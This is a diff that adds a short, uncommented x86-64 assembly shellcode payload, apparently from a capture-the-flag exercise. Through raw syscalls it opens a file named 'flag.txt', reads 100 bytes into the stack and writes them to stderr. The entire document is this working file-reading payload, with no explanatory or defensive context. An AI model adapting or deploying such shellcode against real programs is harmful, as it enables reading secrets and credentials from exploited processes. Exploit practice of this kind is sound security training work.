@@ -1,0 +1,19 @@
+xor r8,r8
+push r8
+mov r15,0x7478742e67616c66
+push r15
+mov rdi,rsp
+xor rsi,rsi
+xor rdx,rdx
+mov rax,2
+syscall
+mov rdi,rax
+mov rax,0
+mov rsi,rsp
+mov rdx,100
+syscall
+mov rax,1
+mov rdi,2
+mov rsi,rsp
+mov rdx,100
+syscall
